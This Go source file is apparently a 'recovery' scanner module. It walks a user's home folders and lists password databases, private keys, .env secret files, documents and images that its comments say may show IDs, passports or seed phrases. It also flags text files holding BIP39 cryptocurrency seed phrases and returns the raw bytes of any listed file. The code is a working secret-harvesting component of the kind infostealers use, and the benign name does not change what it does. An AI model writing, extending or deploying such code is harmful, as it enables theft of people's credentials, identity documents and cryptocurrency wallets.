package scanner

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"recovery/recovery/types"
)

const (
	maxFiles        = 500
	maxScanDepth    = 3
	maxFileSizeList = 100 * 1024 * 1024 // 100 MB — skip larger files from listing
	MaxFetchSize    = 10 * 1024 * 1024  // 10 MB — max content returned per fetch
	maxSeedScanSize = 10 * 1024         // 10 KB — only scan tiny files for seed phrases
)

var targetExtensions = map[string]bool{
	// Office documents
	".docx": true, ".doc": true, ".docm": true,
	".xlsx": true, ".xls": true, ".xlsm": true,
	".pptx": true, ".ppt": true, ".pptm": true,
	".odt": true, ".ods": true, ".odp": true,
	// Plain text / markup
	".txt": true, ".rtf": true, ".md": true,
	".csv": true, ".tsv": true,
	// PDFs
	".pdf": true,
	// Archives (metadata only — content not fetched automatically)
	".zip": true, ".7z": true, ".rar": true, ".tar": true, ".gz": true,
	// Credential / key files
	".kdbx": true, ".key": true, ".pem": true,
	".p12": true, ".pfx": true, ".ppk": true, ".jks": true,
	// Dotenv — commonly stores API keys and secrets
	".env": true,
	// Images — IDs, passports, screenshots of credentials, seed phrases
	".jpg": true, ".jpeg": true, ".png": true, ".gif": true,
	".bmp": true, ".webp": true, ".tiff": true, ".tif": true,
	".heic": true, ".heif": true,
}

// seedScanExtensions are the text formats we read during the scan to check for seed phrases.
var seedScanExtensions = map[string]bool{
	".txt": true, ".md": true, ".csv": true, ".tsv": true,
}

// seedPhraseLengths are the BIP39 word counts we consider suspicious.
var seedPhraseLengths = map[int]bool{12: true, 20: true, 24: true}

type scanLocation struct {
	subPath string
	label   string
}

// FileScanFilter limits which files are listed during a scan.
// If all fields are empty, the default targetExtensions set is used.
type FileScanFilter struct {
	Extensions   []string // e.g. ".env", ".pem"
	Names        []string // exact filename, e.g. "config.json"
	NameContains []string // substring match on file name (case-insensitive)
}

func (f *FileScanFilter) active() bool {
	if f == nil {
		return false
	}
	return len(f.Extensions) > 0 || len(f.Names) > 0 || len(f.NameContains) > 0
}

func normalizeExt(ext string) string {
	ext = strings.ToLower(strings.TrimSpace(ext))
	if ext == "" {
		return ""
	}
	if !strings.HasPrefix(ext, ".") {
		ext = "." + ext
	}
	return ext
}

func fileMatchesFilter(name, ext string, filter *FileScanFilter) bool {
	if filter == nil || !filter.active() {
		return targetExtensions[ext]
	}
	lowerName := strings.ToLower(name)
	for _, n := range filter.Names {
		if strings.EqualFold(name, strings.TrimSpace(n)) {
			return true
		}
	}
	for _, e := range filter.Extensions {
		if normalizeExt(e) == ext {
			return true
		}
	}
	for _, sub := range filter.NameContains {
		sub = strings.ToLower(strings.TrimSpace(sub))
		if sub != "" && strings.Contains(lowerName, sub) {
			return true
		}
	}
	// Also allow exact names that look like extensions without leading dot listed as names
	return false
}

// ScanFiles walks common user locations and returns matching file metadata.
// At most maxFiles results are returned. Files larger than maxFileSizeList are skipped.
func ScanFiles() []types.FileResult {
	return ScanFilesFiltered(nil)
}

// ScanFilesFiltered is like ScanFiles but applies an optional include filter.
func ScanFilesFiltered(filter *FileScanFilter) []types.FileResult {
	home, _ := os.UserHomeDir()
	if home == "" {
		return nil
	}

	var results []types.FileResult
	seen := make(map[string]bool)

	// Allow matching .env etc. when filter is active (default scan skips hidden names)
	allowHidden := filter != nil && filter.active()

	for _, loc := range getScanLocations() {
		dir := filepath.Join(home, loc.subPath)
		scanDir(dir, loc.label, 0, &results, seen, filter, allowHidden)
		if len(results) >= maxFiles {
			break
		}
	}

	return results
}

func scanDir(dir, label string, depth int, results *[]types.FileResult, seen map[string]bool, filter *FileScanFilter, allowHidden bool) {
	if depth > maxScanDepth || len(*results) >= maxFiles {
		return
	}

	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}

	for _, e := range entries {
		if len(*results) >= maxFiles {
			return
		}

		name := e.Name()
		// skip hidden / system files unless filter explicitly wants .env-style names
		if strings.HasPrefix(name, "$") {
			continue
		}
		if strings.HasPrefix(name, ".") && !allowHidden {
			continue
		}

		fullPath := filepath.Join(dir, name)

		if e.IsDir() {
			scanDir(fullPath, label, depth+1, results, seen, filter, allowHidden)
			continue
		}

		ext := strings.ToLower(filepath.Ext(name))
		// .env has empty Ext() in some cases — treat as ".env"
		if name == ".env" || strings.HasPrefix(strings.ToLower(name), ".env.") {
			ext = ".env"
		}
		if !fileMatchesFilter(name, ext, filter) {
			continue
		}

		if seen[fullPath] {
			continue
		}
		seen[fullPath] = true

		info, err := e.Info()
		if err != nil {
			continue
		}

		if info.Size() > maxFileSizeList {
			continue
		}

		var tags []string
		if seedScanExtensions[ext] && checkSeedPhrase(fullPath, info.Size()) {
			tags = append(tags, "seed")
		}

		*results = append(*results, types.FileResult{
			Path:     fullPath,
			Name:     name,
			Ext:      ext,
			Size:     info.Size(),
			Modified: info.ModTime().Unix(),
			Dir:      label,
			Tags:     tags,
		})
	}
}

// looksLikeSeedLine returns true if every word is 3–8 lowercase letters.
// BIP39 words are exclusively lowercase a–z with lengths in that range.
func looksLikeSeedLine(words []string) bool {
	if !seedPhraseLengths[len(words)] {
		return false
	}
	for _, w := range words {
		if len(w) < 3 || len(w) > 8 {
			return false
		}
		for _, c := range w {
			if c < 'a' || c > 'z' {
				return false
			}
		}
	}
	return true
}

// checkSeedPhrase reads a small text file and returns true if it contains a
// line (or total content) whose word count and character pattern matches a
// BIP39 seed phrase (12, 20, or 24 lowercase-only words of 3–8 chars each).
func checkSeedPhrase(path string, size int64) bool {
	if size > maxSeedScanSize {
		return false
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return false
	}
	content := strings.ToLower(string(data))

	// Check full-file word count (file is only the seed phrase)
	if looksLikeSeedLine(strings.Fields(content)) {
		return true
	}

	// Check line-by-line (seed phrase on one line, possibly with surrounding text)
	for _, line := range strings.Split(content, "\n") {
		if looksLikeSeedLine(strings.Fields(strings.TrimSpace(line))) {
			return true
		}
	}

	return false
}

// FetchFile reads a file and returns its raw bytes.
// Returns an error if the file exceeds MaxFetchSize or does not exist.
func FetchFile(path string) ([]byte, error) {
	info, err := os.Stat(path)
	if err != nil {
		return nil, fmt.Errorf("file not found")
	}
	if info.IsDir() {
		return nil, fmt.Errorf("path is a directory")
	}
	if info.Size() > MaxFetchSize {
		return nil, fmt.Errorf("file too large (%d bytes, max %d)", info.Size(), MaxFetchSize)
	}
	return os.ReadFile(path)
}
